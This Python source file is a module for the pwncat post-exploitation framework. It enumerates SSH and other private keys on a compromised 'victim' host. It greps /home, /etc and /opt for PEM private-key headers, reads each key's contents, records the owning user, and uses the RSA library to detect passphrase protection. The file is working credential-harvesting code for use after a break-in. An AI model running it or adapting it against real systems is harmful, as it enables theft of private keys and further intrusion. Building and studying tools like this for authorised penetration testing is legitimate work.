#!/usr/bin/env python3
import dataclasses
from typing import Generator
import re
from Crypto.PublicKey import RSA

from colorama import Fore

import pwncat
from pwncat import util

name = "pwncat.enumerate.private_key"
provides = "system.user.private_key"
per_user = True
encrypted_pattern = re.compile(r"^Proc-Type: .*,ENCRYPTED.*$", re.IGNORECASE)


@dataclasses.dataclass
class PrivateKeyFact:
    """
    An enumeration fact we may collect at some point
    """

    uid: int
    """ The user we believe the private key belongs to """
    path: str
    """ The path to the private key on the remote host """
    content: str
    """ The actual content of the private key """
    encrypted: bool
    """ Is this private key encrypted? """

    def __str__(self):
        if self.uid == 0:
            color = "red"
        else:
            color = "green"
        return f"Potential private key for [{color}]{self.user.name}[/{color}] at [cyan]{self.path}[/cyan]"

    @property
    def description(self) -> str:
        return self.content

    @property
    def user(self):
        return pwncat.victim.find_user_by_id(self.uid)


def enumerate() -> Generator[PrivateKeyFact, None, None]:

    data = []

    # Search for private keys in common locations
    with pwncat.victim.subprocess(
        "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null"
    ) as pipe:
        for line in pipe:
            line = line.strip().decode("utf-8").split(" ")
            uid, path = int(line[0]), " ".join(line[1:])
            data.append(PrivateKeyFact(uid, path, None, False))

    for fact in data:
        try:
            with pwncat.victim.open(fact.path, "r") as filp:
                fact.content = filp.read().strip().replace("\r\n", "\n")

            try:
                # Try to import the key to test if it's valid and if there's
                # a passphrase on the key. An "incorrect checksum" ValueError
                # is raised if there's a key. Not sure what other errors may
                # be raised, to be honest...
                RSA.importKey(fact.content)
            except ValueError as exc:
                if "incorrect checksum" in str(exc).lower():
                    # There's a passphrase on this key
                    fact.encrypted = True
                else:
                    # Some other error happened, probably not a key
                    continue
            yield fact
        except (PermissionError, FileNotFoundError):
            continue
